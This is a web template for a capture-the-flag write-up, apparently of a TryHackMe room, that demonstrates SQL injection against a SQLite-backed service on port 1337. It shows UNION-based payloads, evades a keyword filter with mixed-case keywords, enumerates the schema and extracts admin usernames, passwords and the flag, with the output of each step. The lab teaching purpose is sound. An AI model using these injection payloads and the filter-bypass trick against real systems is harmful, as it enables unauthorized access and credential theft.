{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Exploitation", "exploitation")}}

{{text("In this challange we don't have to do any port scanning, since the room tells us to connect directly over port <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>1337</code>.")}}

{{image("../../static/writeups/lightroom/images/000001.jpg")}}

{{text("We get connected to a database, and the application asks for our username. Room's description told us <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>smokey</code> is a valid user, so we will try that.")}}

{{image("../../static/writeups/lightroom/images/000002.jpg")}}

{{text("Application returns a password for the user we entered. We can deduce that if we get the username of an admin, we will be able to receive his password as well.")}}

{{text("Firstly, let's try to find a table that contains the list of usernames in the database.")}}

{{text("We can try to accomplish that using the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>UNION</code> operator, which combines the results of two or more <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>SELECT</code> queries.")}}

{{text("Right now, the query probably looks like this <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>SELECT password FROM users WHERE username = '{user_input}'</code>, we will modify it by  adding another <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>SELECT</code> statement to retrieve different tables that are in the database.")}}

{{text("But before that, we should determinate which DBMS is used, so we know which payload to use.")}}

{{console("\' UNION SELECT sqlite_version()'", "Ahh there is a word in there I don't like :(")}}

{{text("Seems like there is some kind of filter in place preventing us from using this query. We can try to get around it using capital letters.")}}

{{console("\' UNioN SEleCT sqlite_version()'", "Password: 3.31.1")}}

{{text("Our query worked successfully and now we know the database is a SQLite Database version 3.31.1.")}}

{{text("In a helpful GitHub repository, we can find all kinds of different SQL injections for that database.")}}

{{link("https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-enumeration", "../../static/writeups/images/github.jpg", "PayloadsAllTheThings/SQL Injection
/SQLite Injection.md")}}

{{text("Now we can extract tables from our database.")}}

{{console("' UNioN SelEct GROUP_CONCAT(sql) from sqlite_master'", "Password: CREATE TABLE usertable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER),CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)

")}}

{{text("Looks like there is a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>admintable</code> and a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>usertable</code>.")}}

{{text("Using another query, we extract a list of the administrators.")}}

{{console("' UniOn SelEct GROUP_CONCAT(username) FROM admintable'", "Password: TryHackMeAdmin,flag")}}

{{text("And now their passwords.")}}

{{console("' UnIoN SeLeCT GROUP_CONCAT(password) from admintable'", "Password: mamZtAuMlrsEy5bp6q17,THM{SQLit3_InJ3cTion_is_SimplE_nO?}")}}

{{script()}}